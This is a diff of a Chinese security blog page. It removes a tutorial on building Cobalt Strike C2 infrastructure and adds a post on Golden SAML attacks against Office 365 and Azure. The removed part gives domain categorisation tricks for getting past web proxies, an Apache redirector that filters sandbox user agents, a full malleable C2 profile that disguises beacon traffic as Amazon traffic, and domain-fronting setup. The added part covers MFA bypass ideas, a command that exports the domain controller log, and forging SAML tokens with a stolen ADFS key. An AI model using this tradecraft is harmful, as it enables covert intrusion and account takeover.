@@ -113,11 +113,11 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2024/12/20/C2基础设施搭建/" >C2基础设施搭建</a>
+			<a href="/2024/12/25/o365 & Azure-GoldenSAML/" >o365 &amp; Azure-GoldenSAML</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
-		<div class="date">post @ 2024-12-20  </div>
+		<div class="date">post @ 2024-12-25  </div>
 		</div>
 	</div>
 	
@@ -127,238 +127,81 @@
   <div class="row">
 	
 	
-		<h1><span id="购买域名">购买域名</span></h1><p>购买的域名可以是一个通用的域名，如”timeupdate.com”</p>
-<p>强烈建议使用子域名，比如：</p>
-<ul>
-<li>sync.timeupdate.com</li>
-</ul>
-<h2><span id="注册域名通常只需要注册一年">注册域名（通常只需要注册一年）</span></h2><p>可以在不限于下面的三个平台去注册域名</p>
-<ul>
-<li><p>GoDaddy</p>
-</li>
-<li><p>NameCheap（支持btc充值）</p>
-<p>如果你想用它进行钓鱼攻击，可以购买Office 365</p>
-<p>购买WhoisGuard保护，以防止通过“whois”泄露信息（现在是免费的，会自动添加）</p>
-</li>
-</ul>
-<p><img src="/images/78.png" alt="78"></p>
-<ul>
-<li>NameSilo（也支持btc）</li>
-</ul>
-<h1><span id="域名分类">域名分类</span></h1><p><strong>域名分类</strong>（Domain Categorization）是一种将域名按照特定标准进行分类的过程。通常，这种分类过程旨在识别和标记域名的用途、风险、合法性等方面。不同的分类标准可能根据域名的内容、所属的公司或服务、用途等因素进行划分。</p>
-<p>在网络安全和反欺诈领域，域名分类通常是为了识别恶意或可疑的域名，防止它们被用于诈骗、网络钓鱼或其他恶意行为。例如，某些域名可能会被分类为“高风险”类别，而另一些则可能被分类为“合法”或“可信”类别。</p>
-<h2><span id="域名分类的具体应用">域名分类的具体应用</span></h2><ol>
-<li><strong>防止恶意域名重复使用</strong>：这是一个防御措施，通过自动化系统识别那些被恶意使用过的域名，并将它们分类为负面或“烧毁”类别，防止它们在未来被恶意重新注册或利用。</li>
-<li><strong>风险管理</strong>：自动化的分类过程帮助域名注册商或管理机构识别可能与恶意活动相关的域名，帮助他们采取适当的安全措施。</li>
-<li><strong>提高可信度</strong>：一些域名可能会被标记为“合法”或“正面”，这些域名的所有者可能会获得更多的信任，特别是在搜索引擎优化（SEO）和品牌保护方面。</li>
-</ol>
-<p>注意：一旦一个域名被标记为恶意之后就永远会带有恶意的标签，应该及时更换域名。</p>
-<h2><span id="提交域名进行分类">提交域名进行分类</span></h2><ul>
-<li>许多网页代理会阻止“未分类”域名</li>
-<li>域名分类通常只需要几个小时</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="center">Blue Coat</th>
-<th><a target="_blank" rel="noopener" href="https://sitereview.bluecoat.com/sitereview.jsp">https://sitereview.bluecoat.com/sitereview.jsp</a> (Symantec)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">Zscalar</td>
-<td><a target="_blank" rel="noopener" href="http://zulu.zscaler.com/">http://zulu.zscaler.com</a></td>
-</tr>
-<tr>
-<td align="center">Forcepoint</td>
-<td><a target="_blank" rel="noopener" href="https://support.forcepoint.com/s/site-lookup">https://support.forcepoint.com/s/site-lookup</a></td>
-</tr>
-<tr>
-<td align="center">McAfee</td>
-<td><a target="_blank" rel="noopener" href="https://trustedsource.org/en/feedback/url?action=checksingle&url=&product=00">https://trustedsource.org/en/feedback/url?action=checksingle&amp;url=&amp;product=00</a></td>
-</tr>
-<tr>
-<td align="center">Barracuda</td>
-<td><a target="_blank" rel="noopener" href="http://www.barracudacentral.org/lookups">http://www.barracudacentral.org/lookups</a></td>
-</tr>
-<tr>
-<td align="center">Trend Micro</td>
-<td><a target="_blank" rel="noopener" href="http://global.sitesafety.trendmicro.com/index.php">http://global.sitesafety.trendmicro.com/index.php</a></td>
-</tr>
-<tr>
-<td align="center">Symantec</td>
-<td><a target="_blank" rel="noopener" href="http://rulespace.com/swg-ratertool/tool.php">http://rulespace.com/swg-ratertool/tool.php</a> (down)</td>
-</tr>
-<tr>
-<td align="center">Sophos</td>
-<td><a target="_blank" rel="noopener" href="https://secure2.sophos.com/en-us/threat-center/reassessment-request.aspx">https://secure2.sophos.com/en-us/threat-center/reassessment-request.aspx</a></td>
-</tr>
-<tr>
-<td align="center">Trustwave</td>
-<td><a target="_blank" rel="noopener" href="https://support.trustwave.com/wfdbcheck.asp">https://support.trustwave.com/wfdbcheck.asp</a></td>
-</tr>
-<tr>
-<td align="center">BrightCloud</td>
-<td><a target="_blank" rel="noopener" href="http://www.brightcloud.com/tools/change-request-url-categorization.php">http://www.brightcloud.com/tools/change-request-url-categorization.php</a></td>
-</tr>
-<tr>
-<td align="center">Check Point</td>
-<td><a target="_blank" rel="noopener" href="https://usercenter.checkpoint.com/ucapps/urlcat/">https://usercenter.checkpoint.com/ucapps/urlcat/</a> (需要登录)</td>
-</tr>
-<tr>
-<td align="center">Zvelo[Check a URL Category</td>
-<td><a target="_blank" rel="noopener" href="https://tools.zvelo.com/">https://tools.zvelo.com/</a></td>
-</tr>
-<tr>
-<td align="center">Palo Alto</td>
-<td><a target="_blank" rel="noopener" href="https://urlfiltering.paloaltonetworks.com/">https://urlfiltering.paloaltonetworks.com/</a></td>
-</tr>
-<tr>
-<td align="center">Forinet</td>
-<td><a target="_blank" rel="noopener" href="http://fortiguard.com/webfilter">http://fortiguard.com/webfilter</a></td>
-</tr>
-</tbody></table>
-<h2><span id="域名分类tips">域名分类Tips</span></h2><ul>
-<li>如果您对基础域名进行分类，通常也会自动分类所有子域名。</li>
-<li>您必须实际拥有一个相关的、非恶意的网站才能进行初步分类。不能只是一个空白页面。</li>
-<li>最简单的办法，使用apache反向代理</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">	ProxyRequests Off</span><br><span class="line">	ProxyPreserveHost On</span><br><span class="line">	ProxyPass / http://google.com/</span><br><span class="line">	ProxyPassReverse / http://google.com/</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+		<p>有时候会碰上这种情况：目标组织中使用了o365，然后很多敏感的东西都在o365上面，但是目标用户开启的MFA，目标组织是混合AzureAD环境并且使用了ADFS，这个时候可以尝试利用GoldenSAML攻击，不是什么新东西，但是还是比较有用的</p>
+<p>曾经有人面试的时候问我，如果没有ADFS的话如何bypass MFA，我说不知道，问他也不告诉我</p>
+<p>我想现在可以回答一些了：</p>
+<p>如果对方机器启用了AzureAdPrt的话可以尝试pass the PRT攻击</p>
+<p>至于当只有hash的时候如何登录o365，一种情况是对方使用了Pass-through Authentication的话可以尝试Hook LogonUserW获取明文密码，如果使用了Seamless Single Sign-On的话可以获取两个特定服务的st，然后ptt登录：<br><a target="_blank" rel="noopener" href="https://trustedsec.com/blog/azure-ad-kerberos-tickets-pivoting-to-the-cloud">https://trustedsec.com/blog/azure-ad-kerberos-tickets-pivoting-to-the-cloud</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.pentestpartners.com/security-blog/bypassing-mfa-on-microsoft-azure-entra-id/">https://www.pentestpartners.com/security-blog/bypassing-mfa-on-microsoft-azure-entra-id/</a></p>
+<p><a target="_blank" rel="noopener" href="https://aadinternals.com/post/kerberos/">https://aadinternals.com/post/kerberos/</a></p>
+<h1><span id="查看对方组织是否使用联合身份认证">查看对方组织是否使用联合身份认证</span></h1><h2><span id="方法一">方法一：</span></h2><p>可以在onedrive或者其他微软登录的地方输入对方的邮箱，如果出现正在跳转到您的组织就说明对方使用了ADFS（对方网络中访问）</p>
+<p><img src="/images/101.png" alt="101"></p>
+<p>一般跳转后的url会出现adfs.*或者sts.*的域名</p>
+<h2><span id="方法二">方法二：</span></h2><p>如果你有一个没有开启MFA的账户（服务账户不会开启）的话，可以直接登录Azure，在Connect Sync可以看到对方使用了哪种认证方式，如下可以看到其使用了联合身份认证（对方网络中访问）</p>
+<p><img src="/images/102.png" alt="102"></p>
+<h2><span id="方法三">方法三：</span></h2><p>使用AADInternals</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Invoke-AADIntReconAsOutsider -Domain domain.com</span><br></pre></td></tr></table></figure>
 
-<h2><span id="其他选择购买过期的域名">其他选择（购买过期的域名）</span></h2><ul>
-<li><p>优点：</p>
-<p>具有域名历史</p>
-<p>可能有良好的声誉</p>
-<p>已分类，并且可能被安全软件信任</p>
-</li>
-<li><p>缺点：</p>
-<p>无法控制域名的名称</p>
-</li>
-<li><p>自动化工具</p>
-<p>CatMyFish - <a target="_blank" rel="noopener" href="https://github.com/Mr-Un1k0d3r/CatMyFish">https://github.com/Mr-Un1k0d3r/CatMyFish</a> （过时了）</p>
-</li>
-</ul>
-<h1><span id="基础设施组件"><strong>基础设施组件</strong></span></h1><ul>
-<li>C2 服务器（2-3 个Cobalt Strike TeamServer 服务器）</li>
-<li>Redirector (or Domain Fronting 每个TeamServer至少一个)</li>
-<li>有效载荷和文件托管（1-2 个服务器）</li>
-<li>钓鱼服务器（1-2 个服务器）</li>
-<li>总服务器数量：6 个或更多</li>
-</ul>
-<h1><span id="基础设施访问策略设置">基础设施访问策略设置</span></h1><h2><span id="teamserver服务器设置">TeamServer服务器设置</span></h2><p>仅与TeamServer服务器进行必要的通信：</p>
-<ul>
-<li>Beacon通信 （所有通信都来自Redirector）</li>
-<li>Cobalt Strike 客户端（设置仅允许你的出口IP访问50050端口，也可以将50050改为其他端口，或者通过隧道进行访问）</li>
-<li>SSH（设置仅允许你的出口IP访问22端口）</li>
-<li>可能的代理跳板端口（设置仅允许你的出口IP访问）</li>
-</ul>
-<p>示例 iptables 规则，只允许来自Redirector的 HTTP(S) 通信：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 443 ! -s &#123;redirIP&#125; -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 ! -s &#123;redirIP&#125; -j DROP</span><br><span class="line">iptables -save</span><br></pre></td></tr></table></figure>
+<h1><span id="内网定位adfs机器">内网定位ADFS机器</span></h1><h2><span id="方法一">方法一：</span></h2><p>通过ldap查询机器名称带有adfs字样的机器</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADComputer</span> <span class="literal">-LDAPFilter</span> <span class="string">&quot;(samaccountname=*adfs*)&quot;</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com <span class="comment">#走的9389端口</span></span><br></pre></td></tr></table></figure>
 
-<p>如果使用的是像Azure、Amazon或者DigitalOcean这样的云服务器也可以通过安全组来控制</p>
-<h2><span id="redirector服务器设置">Redirector服务器设置</span></h2><p> 仅与Redirector进行必要的通信：</p>
-<ul>
-<li>Beacon通信 （尽量设置仅允许从目标的出口IP来）</li>
-<li>SSH（设置仅允许你的出口IP访问22端口）</li>
-<li>通过UA头，URL或者其他的http头进行流量的过滤</li>
+<p><img src="/images/103.png" alt="103"></p>
+<h2><span id="方法二">方法二：</span></h2><p>通过域控登录日志查找带有adfs字样的登录事件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; wevtutil /<span class="built_in">r</span>:dc.<span class="number">123</span>.com epl security C:\users\public\<span class="number">1</span>.evtx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/104.png" alt="104"></p>
+<h1><span id="攻击需要的条件">攻击需要的条件</span></h1><ul>
+<li>Token signing certificate with private key</li>
+<li>Issuer uri (IdP “identifier” in Azure AD)</li>
+<li>Target user immutableId (user identifier in on-prem AD)</li>
 </ul>
-<h1><span id="ip隐藏以cloudflare为例">IP隐藏（以cloudflare为例）</span></h1><p>首先在cloudflare上添加一个已经存在的域名</p>
-<p><img src="/images/79.png" alt="79"></p>
-<p>然后再DNS这一栏添加一个A记录和CNAME，A记录为域名指向VPS，cname为子域名</p>
-<p><img src="/images/80.png" alt="80"></p>
-<p>然后将Cloudflare的Nameserver填到之前买的域名的nameserver那里</p>
-<p><img src="/images/81.png" alt="81"></p>
-<p><img src="/images/82.png" alt="82"></p>
-<p>等待域名解析到vps后就接着在SSL&#x2F;TLS的Origin Server项创建证书，记录下证书和私钥以备后面使用</p>
-<p><img src="/images/83.png" alt="83"></p>
-<p>接着在加密模式那里选择full</p>
-<p><img src="/images/84.png" alt="84"></p>
-<p>可以用于域名隐藏的，设置于CobaltStrike有点复杂</p>
-<p><a target="_blank" rel="noopener" href="https://media.defcon.org/DEF%20CON%2028/DEF%20CON%20Safe%20Mode%20presentations/DEF%20CON%20Safe%20Mode%20-%20Erik%20Hunstad%20-%20Domain%20Fronting%20is%20Dead%20Long%20Live%20Domain%20Fronting.pdf">https://media.defcon.org/DEF%20CON%2028/DEF%20CON%20Safe%20Mode%20presentations/DEF%20CON%20Safe%20Mode%20-%20Erik%20Hunstad%20-%20Domain%20Fronting%20is%20Dead%20Long%20Live%20Domain%20Fronting.pdf</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/SixGenInc/Noctilucent?tab=readme-ov-file">https://github.com/SixGenInc/Noctilucent?tab=readme-ov-file</a></p>
-<h1><span id="搭建apache-redirector">搭建Apache Redirector</span></h1><p>安装apache服务器，启用 Apache 的ssl，rewrite，proxy，proxy_http模块，启用 Apache 的 SSL 配置文件 default-ssl.conf</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yum install httpd</span><br><span class="line">yum install mod_ssl -y</span><br><span class="line"></span><br><span class="line">vim /etc/httpd/conf/httpd.conf</span><br><span class="line">LoadModule ssl_module modules/mod_ssl.so</span><br><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br><span class="line">LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_http_module modules/mod_proxy_http.so</span><br><span class="line"></span><br><span class="line">systemctl reload httpd</span><br></pre></td></tr></table></figure>
-
-<p>使用之前在CloudFlare生成的证书和私钥生成CS使用的证书</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -<span class="built_in">export</span> -<span class="keyword">in</span> service.pem -inkey service.key -out 123.com.p12 -name 123.online -passout pass:fuck1235</span><br><span class="line">keytool -importkeystore -deststorepass fuck1235 -destkeypass fuck1235 -destkeystore 123.com.store -srckeystore 123.p12 -srcstoretype PKCS12 -srcstorepass fuck1235 -<span class="built_in">alias</span> 123.com</span><br></pre></td></tr></table></figure>
-
-<p>在&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;ssl.conf中添加以下内容</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Enable SSL</span></span><br><span class="line">SSLEngine On</span><br><span class="line"><span class="comment"># Enable Proxy</span></span><br><span class="line">SSLProxyEngine On</span><br><span class="line"><span class="comment"># Trust Self-Signed Certificates generated by Cobalt Strike</span></span><br><span class="line">SSLProxyVerify none</span><br><span class="line">SSLProxyCheckPeerCN off</span><br><span class="line">SSLProxyCheckPeerName off</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SSLCertificateFile      /cert/service.pem</span><br><span class="line">SSLCertificateKeyFile /cert/service.key</span><br></pre></td></tr></table></figure>
-
-<p>访问网站，出现下面的情况就是成功了</p>
-<p><img src="/images/85.png" alt="85"></p>
-<p>接着修改&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf中的&lt;Directory &#x2F;var&#x2F;www&#x2F;html&gt;处为如下所示</p>
-<p>允许该目录下的 <code>.htaccess</code> 文件覆盖配置，以便用户对特定目录进行自定义配置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /var/www/html&gt;</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Options FollowSymLinks</span><br><span class="line">        Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
-
-<p>接着就是添加.htaccess文件，一个简单的.htaccess文件如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; /var/www/html/.htaccess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line"></span><br><span class="line"># 不允许非浏览器访问</span><br><span class="line">RewriteCond %&#123;HTTP_USER_AGENT&#125; (curl|wget|python) [NC]</span><br><span class="line">RewriteRule ^.*$ https://time.is [R=302,L]</span><br><span class="line"># 限制URI访问</span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; !^(/js/v1/*)</span><br><span class="line">RewriteRule .* https://time.is [R=302,L]</span><br><span class="line"># 限制UA头访问</span><br><span class="line">RewriteCond %&#123;HTTP_USER_AGENT&#125; !(CertUtil|Microsoft-CryptoAPI) [NC]</span><br><span class="line">RewriteRule ^.*$ https://time.is [R=302,L]</span><br><span class="line"># 基于请求IP重定向</span><br><span class="line">RewriteCond %&#123;HTTP:X-Forwarded-For&#125; !^192\.168\.121\.[0-9]&#123;1,3&#125;$ [NC]</span><br><span class="line">RewriteRule ^.*$ https://time.is [R=302,L]</span><br><span class="line"># 重定向到TeamServer</span><br><span class="line">RewriteRule ^.*$ https://172.16.2.1:8080%&#123;REQUEST_URI&#125; [P,L]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果你的访问策略比较严格的话还需要通过iptables设置允许cloudFlare的ip访问</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp -m multiport --dports http,https -s $ip -j ACCEPT</span><br><span class="line">cloudflare的ip范围:</span><br><span class="line">https://www.cloudflare.com/zh-cn/ips/</span><br></pre></td></tr></table></figure>
-
-<h1><span id="搭建teamserver">搭建TeamServer</span></h1><p>修改profile设置证书并匹配我们之前设置的规则</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">set sleeptime &quot;3000&quot;;</span><br><span class="line">set jitter    &quot;20&quot;;</span><br><span class="line"></span><br><span class="line">set data_jitter &quot;50&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set useragent &quot;Microsoft-CryptoAPI&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#custom cert</span><br><span class="line">https-certificate &#123;</span><br><span class="line">    set keystore &quot;/123.com.store&quot;;</span><br><span class="line">    set password &quot;fuck123&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-config &#123;</span><br><span class="line">    set trust_x_forwarded_for &quot;true&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;/js/v1/time.js&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line"></span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;session-token=&quot;;</span><br><span class="line">            prepend &quot;skin=noskin;&quot;;</span><br><span class="line">            append &quot;csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THKUYEZKCKPGY5T42PZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;Content-Encoding&quot; &quot;gzip&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;/js/v1/times.js&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text/xml&quot;;</span><br><span class="line">        header &quot;X-Requested-With&quot; &quot;XMLHttpRequest&quot;;</span><br><span class="line"></span><br><span class="line">        parameter &quot;sz&quot; &quot;160x600&quot;;</span><br><span class="line">        parameter &quot;oe&quot; &quot;oe=ISO-8859-1;&quot;;</span><br><span class="line"></span><br><span class="line">        id &#123;</span><br><span class="line">            parameter &quot;sn&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parameter &quot;s&quot; &quot;3717&quot;;</span><br><span class="line">        parameter &quot;dc_ref&quot; &quot;http%3A%2F%2Fwww.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THK9YEZJCKPGY5T42OZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;x-ua-compatible&quot; &quot;IE=edge&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后启动teamserver查看是否可以上线</p>
-<p><img src="/images/86.png" alt="86"></p>
-<h1><span id="域前置以fastly为例">域前置（以fastly为例）</span></h1><p>工作原理：</p>
-<ol>
-<li><strong>请求目标</strong>：<ul>
-<li>客户端向一个 <strong>内容分发网络（CDN）</strong> 提交请求。请求的目标是一个合法、公开的域名（例如 <code>google.com</code>）。通常这些域名在多数地方不会被封锁。</li>
+<h1><span id="攻击流程">攻击流程</span></h1><ul>
+<li>攻击者访问 ADFS 服务器并提取私钥和证书。</li>
+<li>攻击者尝试访问目标服务（例如 AWS、Office 365）。</li>
+<li>服务将攻击者重定向到 ADFS 进行身份验证。</li>
+<li>绕过 ADFS 身份验证，攻击者使用窃取的私钥签署伪造的 SAML 响应。</li>
+<li>攻击者向目标服务提供已签名的 SAML 响应并获得访问权限。</li>
 </ul>
-</li>
-<li><strong>TLS 握手</strong>：<ul>
-<li>客户端和 CDN 之间建立 <strong>TLS（传输层安全性）</strong> 连接。虽然客户端向一个合法的域名（如 <code>google.com</code>）发起请求，但在请求的 <strong><code>Host</code> 头部</strong>，它指定了实际的目标域名（例如 <code>blocked-site.com</code>），即目标网站是被审查的域名。</li>
-</ul>
-</li>
-<li><strong>CDN 转发请求</strong>：<ul>
-<li>由于 CDN 的边缘服务器会根据客户端请求中的 <strong>SNI（Server Name Indication）</strong> 信息来选择合适的 SSL 证书，它会将请求转发到目标服务器，即使目标域名被审查或封锁。CDN 仅基于 SNI 字段的域名进行 SSL 握手和路由，而实际的请求目标由 <code>Host</code> 头部提供。</li>
-</ul>
-</li>
-<li><strong>加密通信</strong>：<ul>
-<li>由于请求是通过 HTTPS 传输的，所有请求和响应都经过加密。这意味着客户端的真实请求和目标不会在传输过程中被审查或拦截。</li>
-</ul>
-</li>
-<li><strong>响应返回</strong>：<ul>
-<li>一旦目标服务器收到请求并处理它，数据就通过 CDN 返回给客户端，客户端看到的响应是从合法的 CDN 域名返回的，而实际的数据来自被封锁的目标网站。</li>
-</ul>
-</li>
-</ol>
-<p>很遗憾，在2024 年 2 月 27 日fastly通过强制验证 TLS 证书的 SAN 条目与 HTTP 请求的主机标头中的主机名之间的关联的技术ban了域前置(azure在今年前几个月还可以，或者用CDN77?)，但是我们还是可以生成域名滥用其CDN服务。</p>
-<p><a target="_blank" rel="noopener" href="https://archive.torproject.org/websites/lists.torproject.org/pipermail/anti-censorship-team/2023-October/000328.html">https://archive.torproject.org/websites/lists.torproject.org/pipermail/anti-censorship-team/2023-October/000328.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.fastly.com/documentation/guides/concepts/errors/#error-421-misdirected-request">https://www.fastly.com/documentation/guides/concepts/errors/#error-421-misdirected-request</a></p>
-<p><img src="/images/cdn.png" alt="CDN"></p>
-<p>首先创建一个CDN服务</p>
-<p><img src="/images/87.png" alt="87"></p>
-<p>然后添加域名和源然后激活</p>
-<p><img src="/images/88.png" alt="88"></p>
-<p>接着Deactivate然后clone 编辑配置</p>
-<p><img src="/images/89.png" alt="89"></p>
-<p>然后在Origins点击编辑</p>
-<p><img src="/images/90.png" alt="90"></p>
-<p>设置启用TLS但是不验证签名，然后更新</p>
-<p><img src="/images/91.png" alt="91"></p>
-<p>接着在设置中找到缓存设置，设置直接pass不缓存</p>
-<p><img src="/images/92.png" alt="92"></p>
-<p><img src="/images/93.png" alt="93"></p>
-<p>然后在请求设置中按照如下进行设置（Force TLS打开）</p>
-<p><img src="/images/94.png" alt="94"></p>
-<p>接着在header中按照如下进行设置</p>
-<p><img src="/images/95.png" alt="95"></p>
-<p>关闭ForceTLS and enable HSTS</p>
-<p><img src="/images/96.png" alt="96"></p>
-<p>修改之前设置的.htaccess文件，删除通过ip过滤的规则，不知道为什么x-forwarded-for没起作用，测试上线</p>
-<p><img src="/images/97.png" alt="97"></p>
-<p><img src="/images/98.png" alt="98"></p>
-<p>更多可用的CDN：</p>
-<p><a target="_blank" rel="noopener" href="https://arxiv.org/pdf/2310.17851v3">https://arxiv.org/pdf/2310.17851v3</a></p>
